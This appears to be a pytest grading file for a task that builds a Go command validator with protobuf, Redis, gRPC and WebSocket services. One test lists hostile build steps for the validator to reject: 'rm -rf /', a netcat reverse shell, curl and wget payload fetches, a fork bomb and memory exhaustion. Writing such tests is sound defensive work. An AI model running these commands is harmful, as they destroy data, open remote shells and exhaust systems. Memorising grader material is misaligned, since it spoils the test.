def run_validator(binary, payload, expected):
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
        json.dump(payload, f)
        path = f.name
    try:
        result = subprocess.run([binary, path], stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, timeout=5)
        assert result.returncode == expected, (
            f"validator returned {result.returncode}, expected {expected}, "
            f"for {payload!r}; stderr={result.stderr.decode(errors='replace')!r}"
        )
    finally:
        os.unlink(path)


def test_protobuf_compiled_and_valid():
    assert os.path.isfile(PROTO_FILE), f"{PROTO_FILE} is missing"
    pb_go_files = [os.path.join(APP_DIR, "proto", f)
                   for f in os.listdir(os.path.join(APP_DIR, "proto"))
                   if f.endswith(".pb.go")]
    assert pb_go_files, "No compiled protobuf files (*.pb.go) found"

    descriptor = tempfile.NamedTemporaryFile(delete=False)
    descriptor.close()
    try:
        result = subprocess.run([
            "protoc", f"--proto_path={os.path.join(APP_DIR, 'proto')}",
            "--proto_path=/usr/include", f"--descriptor_set_out={descriptor.name}",
            "--include_imports", PROTO_FILE
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        assert result.returncode == 0, f"build.proto is invalid: {result.stderr}"
        decoded = subprocess.run([
            "protoc", "--decode=google.protobuf.FileDescriptorSet",
            "--proto_path=/usr/include", "google/protobuf/descriptor.proto"
        ], stdin=open(descriptor.name, "rb"), stdout=subprocess.PIPE,
           stderr=subprocess.PIPE, text=True)
        assert decoded.returncode == 0, decoded.stderr
        assert "message_type {" in decoded.stdout, "build.proto defines no messages"
        assert "service {" in decoded.stdout, "build.proto defines no gRPC service"
    finally:
        os.unlink(descriptor.name)

    generated = "\n".join(open(p, errors="replace").read() for p in pb_go_files)
    assert "Code generated by protoc-gen-go" in generated
    assert "protoimpl" in generated or "github.com/golang/protobuf/proto" in generated

    result = subprocess.run(["go", "test", "./proto"], cwd=APP_DIR,
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, timeout=90)
    assert result.returncode == 0, f"generated protobuf Go package does not compile:\n{result.stdout}"


def test_env_configuration():
    assert os.path.isfile(ENV_FILE), f"{ENV_FILE} does not exist"
    content = open(ENV_FILE).read()
    # Preserve the original configuration assertions.
    assert "REDIS_URL=localhost:6379" in content
    assert "GRPC_PORT=50051" in content
    assert "WS_PORT=8081" in content

    active = {}
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, value = line.split("=", 1)
        active[key.strip()] = value.strip().strip("'\"")
    assert active.get("REDIS_URL") == "localhost:6379"
    assert active.get("GRPC_PORT") == "50051"
    assert active.get("WS_PORT") == "8081"


def test_validator_binary_and_source_are_real_go_programs():
    assert os.path.isfile(VALIDATOR_BIN), f"Validator binary not found at {VALIDATOR_BIN}"
    assert os.access(VALIDATOR_BIN, os.X_OK), f"{VALIDATOR_BIN} is not executable"
    assert os.path.isfile(VALIDATOR_SRC), f"Validator source missing at {VALIDATOR_SRC}"
    with open(VALIDATOR_BIN, "rb") as f:
        assert f.read(4) == b"\x7fELF", "validator must be a compiled native executable"
    metadata = subprocess.run(["go", "version", "-m", VALIDATOR_BIN],
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              text=True)
    assert metadata.returncode == 0 and "go1" in metadata.stdout, "validator is not a Go binary"

    rebuilt = os.path.join(tempfile.mkdtemp(), "validator")
    result = subprocess.run(["go", "build", "-o", rebuilt, VALIDATOR_SRC], cwd=APP_DIR,
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, timeout=90)
    assert result.returncode == 0, f"validator/main.go does not build:\n{result.stdout}"

    token = uuid.uuid4().hex
    clean = [
        {"steps": [f"echo {token}"]},
        {"steps": ["go test ./...", "python3 -m pytest", "npm test"]},
        {"name": token, "steps": ["javac Main.java", "go vet ./..."]},
    ]
    evil = [
        {"steps": ["rm -rf /"]},
        {"steps": [f"echo ok; touch /tmp/{token}"]},
        {"steps": [f"echo $({token})"]},
        {"steps": [f"echo `{token}`"]},
        {"steps": [f"curl http://{token}.invalid/payload"]},
        {"steps": [f"wget http://{token}.invalid/payload"]},
        {"steps": [f"nc {token}.invalid 4444 -e /bin/sh"]},
        {"steps": ["bash -c 'exec 9<>/dev/tcp/127.0.0.1/9'"]},
        {"steps": [":(){ :|:& };:"]},
        {"steps": ["stress --vm 8 --vm-bytes 8G"]},
        {"steps": ["python3 -c 'a=bytearray(10**12)'"]},
        {"steps": ["dd if=/dev/zero of=/dev/null bs=1G count=100000"]},
    ]
    for binary in (VALIDATOR_BIN, rebuilt):
        for payload in clean:
            run_validator(binary, payload, 0)
        for payload in evil:
            run_validator(binary, payload, 1)

    # Malformed definitions must fail closed, and the CLI must enforce one argument.
    malformed = tempfile.NamedTemporaryFile(mode="w", delete=False)
    malformed.write('{"steps": [')
    malformed.close()
    try:
        result = subprocess.run([VALIDATOR_BIN, malformed.name], timeout=5)
        assert result.returncode == 1
    finally:
        os.unlink(malformed.name)
    assert subprocess.run([VALIDATOR_BIN], timeout=5).returncode != 0
    assert subprocess.run([VALIDATOR_BIN, "a", "b"], timeout=5).returncode != 0


def test_original_corpora_still_pass():
    evil_files = [os.path.join(EVIL_CORPUS_DIR, f) for f in os.listdir(EVIL_CORPUS_DIR)
                  if f.endswith(".json")]
    clean_files = [os.path.join(CLEAN_CORPUS_DIR, f) for f in os.listdir(CLEAN_CORPUS_DIR)
                   if f.endswith(".json")]
    assert evil_files and clean_files
    for path in evil_files:
        assert subprocess.run([VALIDATOR_BIN, path], timeout=5).returncode == 1
    for path in clean_files:
        assert subprocess.run([VALIDATOR_BIN, path], timeout=5).returncode == 0


def redis_command(*parts):
    request = f"*{len(parts)}\r\n".encode()
    for part in parts:
        raw = str(part).encode()
        request += f"${len(raw)}\r\n".encode() + raw + b"\r\n"
    with socket.create_connection(("127.0.0.1", 6379), timeout=2) as sock:
        sock.sendall(request)
        sock.settimeout(2)
        return sock.recv(65536)


def wait_port(port, timeout=30):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=.5):
                return
        except OSError:
            time.sleep(.25)
    pytest.fail(f"service did not become available on port {port}")


def start_stack():
    script = os.path.join(APP_DIR, "start_services.sh")
    if os.path.isfile(script):
        subprocess.Popen(["bash", script], cwd=APP_DIR, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, start_new_session=True)
    elif os.path.isfile(os.path.join(APP_DIR, "docker-compose.yml")):
        command = ["docker", "compose", "up", "-d"]
        result = subprocess.run(command, cwd=APP_DIR, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=True, timeout=90)
        if result.returncode != 0:
            result = subprocess.run(["docker-compose", "up", "-d"], cwd=APP_DIR,
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, timeout=90)
        assert result.returncode == 0, result.stdout
    else:
        pytest.fail("neither start_services.sh nor docker-compose.yml exists")


def websocket_handshake():
    key = base64.b64encode(os.urandom(16)).decode()
    request = (
        "GET / HTTP/1.1\r\nHost: localhost:8081\r\nUpgrade: websocket\r\n"
        f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
        "Sec-WebSocket-Version: 13\r\n\r\n"
    ).encode()
    with socket.create_connection(("127.0.0.1", 8081), timeout=3) as sock:
        sock.sendall(request)
        response = sock.recv(4096).decode(errors="replace")
    expected = base64.b64encode(hashlib.sha1(
        (key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest()).decode()
    assert " 101 " in response.split("\r\n", 1)[0], response
    assert re.search(r"(?im)^Upgrade:\s*websocket\s*$", response)
    assert re.search(rf"(?im)^Sec-WebSocket-Accept:\s*{re.escape(expected)}\s*$", response)


def test_services_and_go_logger_integration():
    go_sources = []
    for root, _, files in os.walk(APP_DIR):
        if root.startswith(os.path.join(APP_DIR, "validator")):
            continue
        for name in files:
            if name.endswith(".go") and not name.endswith(".pb.go"):
                go_sources.append(open(os.path.join(root, name), errors="replace").read())
    source = "\n".join(go_sources)
    assert source.strip(), "dispatcher/logger Go implementation is missing"
    assert re.search(r'encoding/json|json\.(Unmarshal|Decoder)', source), \
        "Go dispatcher does not contain translated message parsing logic"
    assert re.search(r'websocket|Sec-WebSocket|Upgrade', source, re.I), \
        "Go dispatcher does not implement WebSocket updates"
    assert re.search(r'MemStats|ReadMemStats|memory|alloc', source, re.I), \
        "Go logger does not implement memory-profiled updates"
    assert re.search(r'redis', source, re.I), "Go dispatcher has no Redis integration"

    start_stack()
    wait_port(6379)
    wait_port(50051)
    wait_port(8081)

    assert redis_command("PING").startswith(b"+PONG")
    clients = redis_command("CLIENT", "LIST")
    assert clients.startswith(b"$") and clients.count(b"addr=") >= 2, \
        "no service appears to be connected to Redis"

    # A real gRPC listener must speak HTTP/2 and return a SETTINGS frame.
    with socket.create_connection(("127.0.0.1", 50051), timeout=3) as sock:
        sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
        sock.settimeout(3)
        data = sock.recv(4096)
    assert len(data) >= 9 and data[3] == 4, "port 50051 is not a functioning gRPC/HTTP2 server"
    websocket_handshake()


